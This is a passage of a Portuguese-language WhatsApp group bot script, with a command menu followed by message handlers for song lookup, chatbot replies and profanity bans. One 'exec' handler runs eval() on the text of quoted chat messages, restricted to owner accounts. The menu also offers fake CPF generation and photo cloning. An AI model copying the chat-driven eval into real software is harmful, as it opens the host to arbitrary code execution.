║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Rankpau
║
╠┄┄┄⟨👻𝐌 𝐄 𝐒 𝐓 𝐑 𝐄👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}fotomenu (marca-img)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}blockcmd  (cmd)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}unblockcmd (cmd)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}legendabv (oq qr)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}legendasaiu (oq qr)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}legendasaiu2 (oq qr)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}legendabv2 (oq qr)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}prefixo_tipo2 simbolo
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}prefixo_tipo_off
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}fundobemvindo (marcar-img)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}fundosaiu (marcar-img)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serpremium
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}listagp
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}antipalavrão 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}antiligar 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}antipv 1 / 0 (esse da block)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}addpalavra (palavrão)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}delpalavra (palavrão)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}antipvon
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}antipvoff
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}ativo
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}ausente (fale-oq-faz)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}delpremium @(marca)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}addpremium @(marca)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}clonar [@] (rouba ft de prf)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}fotobot (img, = foto do BT)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}descriçãogp (digite-algo)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}limpar (limpa tds conversas)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}block [@] (bloq de usar cmds) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}unblock [@] (desbloquear) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}setprefix  (prefixo-novo)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}bangp
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}unbangp
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}dono2 @marca
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}dono3 @marca
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}dono4 @marca
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}dono5 @marca
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}bcgp (TM-PRA-PV-MEMBROS)
║
╠┄┄┄⟨👻𝐄𝐅𝐄𝐈𝐓𝐎𝐒 𝐈𝐌𝐀𝐆𝐄𝐍𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Legenda (marcar)-(img)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Procurado (marcar)-(img)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Hitler (marcar)-(img)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Preso (marcar)-(img)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Lixo (marcar)-(img)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Deletef (marcar)-(img)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Morto (marcar)-(img) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Lgbt (marcar)-(img) 
║
╠┄┄┄⟨👻𝐋 𝐎 𝐆 𝐎 𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Plaquinha
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Plaquinha2
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Plaquinha3
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Plaquinha4
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Plaquinha5
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Plaquinha6
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Plaquinha7
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Plaquinha8
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Plaquinha9
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Plaquinha10
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Plaquinha11
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Marvel  (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}pornhub  (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}space  (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}stone (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}steel (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}grafity (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}america (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}glitch3 (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}hackneon (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}angelwing (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}ffavatar (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}equipemascote (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}txtquadrinhos (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}fpsmascote (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}gizquadro (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}angelglx (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}mascotegame (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}metalgold (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}blackpink (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}wingeffect (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}girlmascote (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}logogame (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}metalgold (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}cup (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}shadow (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}efeitoneon (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}neon2 (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}lobometal (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}cemiterio (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}lovemsg3 (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}madeira (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}florwooden (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}coffecup2 (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}coffecup (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}smoke (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}romantic (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}fire (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}lovemsg2 (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}lovemsg (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}papel (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}style (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}areia (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}3dstone (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}fiction (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}neondevil (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}cattxt (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}pink (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}blood (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}thunder (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}vidro (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}metalfire (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}carbon (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}demonfire (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}transformer (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jokerlogo (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}ossos (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}natal (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}metalblue (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jeans (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}colaq (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}glitch2 (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}asfalto (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}matrix (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}horror (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}nuvem (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}neon3 (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}thunderv2 (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}lava (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}luxury (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}berry (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}neon1 (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}neon (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}neve (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}neongreen (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}rainbow (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}lapis (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}toxic (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}demongreen (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}3dgold (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}halloween (txt)
╠┄┄┄⟨👻𝐌𝐄𝐍𝐔ㅤ𝐏𝐑𝐄𝐌𝐈𝐔𝐌👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Destrava
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Destrava2
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Ddd (DDD)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Cep (NÚMERO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}GerarCPF
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}PremiumList
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}LerFoto (MARCAR)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}EncurtaLink (LINK)
║ 
╠┄┄┄⟨⚠️ 𝐈𝐌𝐏𝐎𝐑𝐓𝐀𝐍𝐓𝐄 ⚠️⟩
║⊱⚠️𝐍𝐚̃𝐨 𝐟𝐥𝐨𝐨𝐝𝐞 𝐬𝐞𝐧𝐚̃𝐨 𝐨𝐬 𝐜𝐨𝐦𝐚𝐧𝐝𝐨𝐬 𝐩𝐨𝐝𝐞𝐦 𝐜𝐚𝐢𝐫!
║⊱⚠️𝐒𝐞 𝐟𝐚𝐥𝐡𝐚𝐫, 𝐨 𝐬𝐞𝐫𝐯𝐢𝐝𝐨𝐫 𝐜𝐚𝐢𝐮 𝐭𝐞𝐦𝐩𝐨𝐫𝐚𝐫𝐢𝐚𝐦𝐞𝐧𝐭𝐞.
║⊱⚠️𝐄𝐦 𝐭𝐞𝐬𝐭𝐞𝐬. 𝐄𝐧𝐭ã𝐨 𝐩𝐨𝐝𝐞 𝐜𝐚𝐢𝐫, 𝐨𝐮 𝐟𝐢𝐜𝐚𝐫 𝐨𝐟𝐟.
║⊱⚠️𝐀𝐜𝐡𝐨𝐮 𝐞𝐫𝐫𝐨𝐬? 𝐓𝐢𝐠𝐚 𝐚𝐨 𝐝𝐨𝐧𝐨 𝐧𝐨 𝐳𝐚𝐩𝐳𝐚𝐩.
║⊱⚠️𝐀𝐥𝐠𝐮𝐧𝐬 𝐜𝐨𝐦𝐚𝐧𝐝𝐨𝐬 𝐩𝐨𝐝𝐞𝐦 𝐝𝐞𝐦𝐨𝐫𝐚𝐫.
╰─────────────────────────╯
`}, {quoted: selo})
}
 if (budy.match(`@5516997227231`)) {
 if (mek.key.fromMe) return 
var zeltas =['jájá ele vai ver sua msg','pare de marcar meu dono🖐😐','só tô vendo vc marcar meu criador','pare de marcar foido','já já ele aparece, enquanto isso vai um café?☕️','aguarde que logo logo ele estará aqui']
var zalts = zeltas[Math.floor(Math.random() * zeltas.length)]
var badin =['1','2','3','@5516997227231']
var oto = badin[Math.floor(Math.random() * badin.length)]
reply(`${logo}`);
conn.sendMessage(from, {sticker: fs.readFileSync(`./armor/sticker/3.webp`)}, {quoted: selo});
 }
if (budy.match(`Puxar Musica`)) {
reply('Vou te ajudar ok mais so dessa vez em 🗿🍷')
if (!isQuotedAudio) return enviar('*『👻』 CADE O AUDIO MEU LINDO*')
let music = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage, 'audio')
let mime = (quoted.info || quoted).mimetype || ""
let m = mime.split('/')[1]
fs.writeFileSync('./armor/js/' + sender + '.' + m, music)
let base64 = fs.readFileSync('./armor/js/' + sender + '.' + m, { encoding: "base64" })
let data = await arcloud(base64)
let res = await yts(data[0].titulo)
let buttons = [
{
buttonId: `${prefix}play_audioyt ${res.all[0].url}`, 
buttonText: 
{
displayText: '『🎵』 ᴀᴜᴅɪᴏ'
}, 
type: 1 
},
{
buttonId: `${prefix}play_videoyt ${res.all[0].url}`, 
buttonText: 
{
displayText: '『🎬』 ᴠɪᴅᴇᴏ'
}, 
type: 1 
}
]
let thumb = await getBuffer(res.all[0].thumbnail)
let tmpe = { 
document: { url: "https://wa.me/5516997357601" }, 
mimetype: 'application/vnd.ms-excel', 
fileName: `${NomeDoBot}`, 
caption: `
*➛『🧙‍♂️』 ✰͜͡𝐓𝐢𝐭𝐮𝐥𝐨 : _${res.all[0].title}_*
*➛『⏳』 ✰͜͡𝐃𝐮𝐫𝐚ç𝐚𝐨 : _${res.all[0].timestamp}_*
*➛『👁️‍🗨️』 ✰͜͡𝐕𝐢𝐞𝐰𝐬 : _${res.all[0].views}_*
*➛『👻』 ✰͜͡𝐂𝐚𝐧𝐚𝐥 : _${res.all[0].author.name}_*
*➛『🔗』ʟɪɴᴋ : _${res.all[0].url}_*`.trim(),
fileLength: '99999999999999', 
mentions: [sender], 
footer: '', 
buttons: buttons, 
headerType: 4, 
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `${res.all[0].title}`, 
mediaType: 2, 
previewType: 'Video',
thumbnail: thumb, 
mediaUrl: `${res.all[0].url}`, 
sourceUrl: 'https://youtu.be/cTc5ywcnWJw'
}
}
} 
conn.sendMessage(from, tmpe, {quoted: selo})
fs.unlinkSync('./armor/js/' + sender + '.' + m)
}
if (budy.match(`Que Musica e essa`)) {
reply('Vou te ajudar ok mais so dessa vez em 🗿🍷')
if (!isQuotedAudio) return enviar('*『👻』 CADE O AUDIO MEU LINDO*')
let music = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage, 'audio')
let mime = (quoted.info || quoted).mimetype || ""
let m = mime.split('/')[1]
fs.writeFileSync('./armor/js/' + sender + '.' + m, music)
let base64 = fs.readFileSync('./armor/js/' + sender + '.' + m, { encoding: "base64" })
let data = await arcloud(base64)
let res = await yts(data[0].titulo)
let buttons = [
{
buttonId: `${prefix}play_audioyt ${res.all[0].url}`, 
buttonText: 
{
displayText: '『🎵』 ᴀᴜᴅɪᴏ'
}, 
type: 1 
},
{
buttonId: `${prefix}play_videoyt ${res.all[0].url}`, 
buttonText: 
{
displayText: '『🎬』 ᴠɪᴅᴇᴏ'
}, 
type: 1 
}
]
let thumb = await getBuffer(res.all[0].thumbnail)
let tmpe = { 
document: { url: "https://wa.me/5516997357601" }, 
mimetype: 'application/vnd.ms-excel', 
fileName: `${NomeDoBot}`, 
caption: `
*➛『🧙‍♂️』 ✰͜͡𝐓𝐢𝐭𝐮𝐥𝐨 : _${res.all[0].title}_*
*➛『⏳』 ✰͜͡𝐃𝐮𝐫𝐚ç𝐚𝐨 : _${res.all[0].timestamp}_*
*➛『👁️‍🗨️』 ✰͜͡𝐕𝐢𝐞𝐰𝐬 : _${res.all[0].views}_*
*➛『👻』 ✰͜͡𝐂𝐚𝐧𝐚𝐥 : _${res.all[0].author.name}_*
*➛『🔗』 ✰͜͡ʟɪɴᴋ : _${res.all[0].url}_*`.trim(),
fileLength: '99999999999999', 
mentions: [sender], 
footer: '', 
buttons: buttons, 
headerType: 4, 
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `${res.all[0].title}`, 
mediaType: 2, 
previewType: 'Video',
thumbnail: thumb, 
mediaUrl: `${res.all[0].url}`, 
sourceUrl: 'https://youtu.be/cTc5ywcnWJw'
}
}
} 
conn.sendMessage(from, tmpe, {quoted: selo})
fs.unlinkSync('./armor/js/' + sender + '.' + m)
}
if (budy.match(`Quem Canta essa musica`)) {
reply('vou te ajudar fecho?')
if (!isQuotedAudio) return reply('*『👻』 CADE O AUDIO MEU LINDO*')
let music = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage, 'audio')
let mime = (quoted.info || quoted).mimetype || ""
let m = mime.split('/')[1]
fs.writeFileSync('./armor/js/' + sender + '.' + m, music)
let base64 = fs.readFileSync('./armor/js/' + sender + '.' + m, { encoding: "base64" })
let data = await arcloud(base64)
let res = await yts(data[0].titulo)
let buttons = [
{
buttonId: `${prefix}play_audioyt ${res.all[0].url}`, 
buttonText: 
{
displayText: '『🎵』 ᴀᴜᴅɪᴏ'
}, 
type: 1 
},
{
buttonId: `${prefix}play_videoyt ${res.all[0].url}`, 
buttonText: 
{
displayText: '『🎬』 ᴠɪᴅᴇᴏ'
}, 
type: 1 
}
]
let thumb = await getBuffer(res.all[0].thumbnail)
let tmpe = { 
document: { url: "https://wa.me/5516997357601" }, 
mimetype: 'application/vnd.ms-excel', 
fileName: `${NomeDoBot}`, 
caption: `
*➛『🧙‍♂️』 ✰͜͡𝐓𝐢𝐭𝐮𝐥𝐨 : _${res.all[0].title}_*
*➛『⏳』 ✰͜͡𝐃𝐮𝐫𝐚ç𝐚𝐨 : _${res.all[0].timestamp}_*
*➛『👁️‍🗨️』 ✰͜͡𝐕𝐢𝐞𝐰𝐬 : _${res.all[0].views}_*
*➛『👻』 ✰͜͡𝐂𝐚𝐧𝐚𝐥 : _${res.all[0].author.name}_*
*➛『🔗』ʟɪɴᴋ : _${res.all[0].url}_*`.trim(),
fileLength: '99999999999999', 
mentions: [sender], 
footer: '', 
buttons: buttons, 
headerType: 4, 
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `${res.all[0].title}`, 
mediaType: 2, 
previewType: 'Video',
thumbnail: thumb, 
mediaUrl: `${res.all[0].url}`, 
sourceUrl: 'https://youtu.be/cTc5ywcnWJw'
}
}
} 
conn.sendMessage(from, tmpe, {quoted: selo})
fs.unlinkSync('./armor/js/' + sender + '.' + m)
}
if (budy.match(`Luix bot`)) {
if (args.length < 1) return reply(`Exemplo: ${prefix + command} quem criou o minecraft?`)
try {
let openai = await ia(q) // Defina a key do chatgpt no arquivo ia.js ele está dentro da pasta js
let response = openai[0].resposta
delay(1000)
return reply(response)
} catch(e) {
console.log(e)
return reply('*🧸Oops, não e possível utilizar o comando até a key do chatgpt seja definida...*')
}}

if (messagesC == "aniversário"){
tujuh = fs.readFileSync('./audios/aniversario.mp3');
await conn.sendMessage(from, {audio: tujuh, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
}
if (messagesC == "corno"){
tujuh = fs.readFileSync('./audios/corno.mp3');
await conn.sendMessage(from, {audio: tujuh, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
}


if(messagesC.includes('exec')) {
if(!SoDono && !isnit && !issupre && !ischyt) return
try{
paramsQuoted = info.message.extendedTextMessage.contextInfo.quotedMessage.conversation || info.message.extendedTextMessage.contextInfo.quotedMessage.extendedTextMessage.text;	
return eval(`${paramsQuoted}`)
console.log(`[EXEC]~> ${paramsQuoted}`)
}catch(e){
reply(e)
}
}

//==============(ANTILINK)===============\\

switch(ants){
} 

//=========[--ANTI PALAVRÃO --]==========\\
if (isGroup && isPalavrao && isBotGroupAdmins) { //CREDITOS TIAGO
 if (palavra.includes(budy2)) {
 if (!isGroupAdmins) {
 conn.sendMessage(from, {text: `SEM PALAVRÃO!! 😠!!`}, {quoted : info})       
setTimeout( () => {
if(!JSON.stringify(groupMembers).includes(sender)) return  
conn.groupParticipantsUpdate(from, [sender], 'remove')
}, 2000)
reply("2")
setTimeout( () => {
reply("1")
}, 1000)
setTimeout( () => {
conn.sendMessage(from, {text: `*「 🗣️ANTI PALAVRÃO🗣️ 」*\nVocê será banido do gp, Na proxima tenha ética ao falar!!`}, {quoted : info}).catch(e => {
conn.sendMessage(from, {text: `InFelizmente, não sou um administrador, entt não posso te banir!!`}, {quoted : info})
})       							
}, 0)
} else {
return reply(`VOCÊ PODE ${pushname} 😇`)
}
}
}

 
//================(SIMIH-2)=================\\

if (!isCmd && isSimi2 && isGroup) {
if(isCmd || isUrl(budy2)) return
if(budy.length >= 500) return 
if(budy.includes("@55")) return
if (info.key.fromMe) return
if (type == 'extendedTextMessage' && prefix.includes(info.message.extendedTextMessage.contextInfo.quotedMessage.conversation[0])) return
insert(type, info)
const sami = await response(budy)

if (sami) conn.sendMessage(from, {text: sami, thumbnail: blalogoofc}, {quoted: selo});
}


 //===============(SIMIH-1)===============\\
    
if (isGroup && isSimi && budy != undefined) {
if(type == 'imageMessage') return 
if(type == 'audioMessage') return 
if(type == 'stickerMessage') return   
if(info.key.fromMe) return 
console.log(budy)
muehe = await simih(budy)
console.log(muehe)
reply(muehe)
}


//========================================\\

hora2 = moment.tz('America/Sao_Paulo').format('HH:mm:ss');

if (isCmd) {
if (SoDono) {
audiomenu = await fs.readFileSync("./audios/mestre.mp3")
conn.sendMessage(from, {audio: audiomenu, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
} else conn.sendMessage(from, {sticker: fs.readFileSync(`./naoexiste.webp`)}, {quoted: info});
hora1 = moment.tz('America/Sao_Paulo').format('HH:mm:ss')
}
//========================================\\

}
}
}
msgupsrt().catch(e => {
console.log(e)
})
}

if(events['connection.update']) {
const update = events['connection.update']  
const { connection, lastDisconnect, qr, isNewLogin, receivedPendingNotifications } = update  
if(connection === "open") {
console.log(banner2.string)  
console.log(color(
`CAUMA BRO TO ON`))
}
require("./armor/conect.js")(conn, connection, lastDisconnect, qr, isNewLogin, receivedPendingNotifications, qrcode)

file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(color("SALVE SALVE TO ATUALIZANDO A PORRA DA INDEX QUE VOCE NAO PARA DE FICAR MEXENDO", "red"))
delete require.cache[file]
require(file)  
})

}

}
)

return conn

}

startAle().catch(e => {
console.log(e.stack+" -CONEXÃO...")
})

exports.startAle = startAle

file = require.resolve("./dono/settings.json")
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(color("SALVE SALVE TO ATUALIZANDO", "red"))
delete require.cache[file]
require(file)
})